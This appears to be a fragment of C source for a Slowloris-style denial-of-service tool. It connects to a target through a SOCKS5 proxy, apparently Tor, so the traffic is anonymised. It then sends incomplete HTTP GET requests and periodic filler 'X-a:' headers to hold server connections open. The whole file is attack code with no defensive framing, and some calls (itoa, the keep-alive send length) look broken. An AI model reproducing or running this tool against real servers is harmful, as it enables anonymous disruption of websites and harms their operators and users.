int createSocket(int socket_counter){
  int socket_fd;
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  if(socket_fd < 0)
  {
    perror("Socket creation error");
    printf("errno = %d\n", errno);
  }
  //else printf("Created socket no %d with socket_fd=%d\n", socket_counter, socket_fd);

  return socket_fd;
}

int connectToServer(int socket_fd, struct sockaddr_in server){
  if (connect(socket_fd, (struct sockaddr *) &server, sizeof(server)) < 0)
  {
    perror("Server connect error");
    printf("errno = %d\n", errno);
    return -1;
  }
  //printf("Connecting socket_fd %d to server\n", socket_fd);
  return 0;
}



int sendRequestToServer(int tor_sock, char* ip, int target_port){

  //socks5 client greeting - no auth (0x00)
  unsigned char client_greeting[3] = { 0x05, 0x01, 0x00};
  send(tor_sock, client_greeting, 3, 0);

  //socks5 response
  unsigned char resp1[2];
  recv(tor_sock, resp1, 2 ,0);
  //printf("Response from tor server %x\n", resp1[0]);
   
  char* address;
  address = (char*)malloc((sizeof(char) * strlen(ip)) +1);
  strcpy(address, ip);
  strcat(address, "\0"); 

  char  address_len = (char)strlen(address);
  short port = htons(target_port);

  char TmpReq[4] = {
          0x05, // SOCKS5
          0x01, // CONNECT
          0x00, // RESERVED
          0x03, // Domain
        };

    //char* Req2 = (char*) malloc(sizeof(char) * (4 + 1 + DomainLen + 2));
    char Req2[100];
    memset(Req2, '\0', sizeof(Req2));
    memcpy(Req2, TmpReq, 4);                // 5, 1, 0, 3
    memcpy(Req2 + 4, &address_len, 1);        // Domain Length
    memcpy(Req2 + 5, address, address_len);    // Domain
    memcpy(Req2 + 5 + address_len, &port, 2); // Port

    send(tor_sock, (char*)Req2, 4 + 1 + address_len + 2, 0);
   
    //free(Req2);

    char resp[10];
    recv(tor_sock, resp, 10, 0);
    if(resp[1] != 0x00)
    {
      printf(" [*] Error : %c\n", resp[1]);
      //return(-1); // ERROR
    }
 
  char get_request[300] = "";
  char user_agent[500] = "";
  char language_header[100]="";
  
  char num_string[10] = "";
  strcat(get_request, "GET /?");
  strcat(get_request, itoa(num_string, 2000));
  char* get_request_2 = " HTTP/1.1\r\n";	  
  strcat(get_request, get_request_2);

  strcpy(language_header,"Accept-language: en-US,en,q=0.5\r\n");	
  
  strcat(user_agent, "User-Agent: ");  
  strcat(user_agent, user_agents[0]);
  strcat(user_agent, "\r\n");
  
  if (send(tor_sock, get_request, strlen(get_request), 0) == -1){perror("Send error in GET");return -1;}
  if (send(tor_sock, user_agent, strlen(user_agent), 0) == -1){perror("Send error in agent");return -1;}
  if (send(tor_sock, language_header, strlen(language_header), 0) == -1){perror("Send error in lang");return -1;}

  return tor_sock;

}

int handleSocket(int socket_list_pos, struct sockaddr_in server, char* ip, int target_port){
  int socket_fd;
  socket_fd = createSocket(socket_list_pos);
  if (socket_fd < 0){return -1;}    
  if (connectToServer(socket_fd, server) == -1){return -1;}
  if (sendRequestToServer(socket_fd, ip, target_port) == -1){return -1;}
  return socket_fd;
}

int sendKeepAliveHeaders(int socket_fd){

  char num_string[10] = "";
  char keep_alive[100] = "";

  strcat(keep_alive, "X-a: ");
  strcat(keep_alive, itoa(num_string, 5000));
  strcat(keep_alive, "\r\n");

  if (send(socket_fd, keep_alive, sizeof(keep_alive), 0) == -1){perror("Send error in keep-alive");return -1;}

  //printf("Socket %d sent keep-alive %s\n", socket_fd, keep_alive);
  return socket_fd;
}
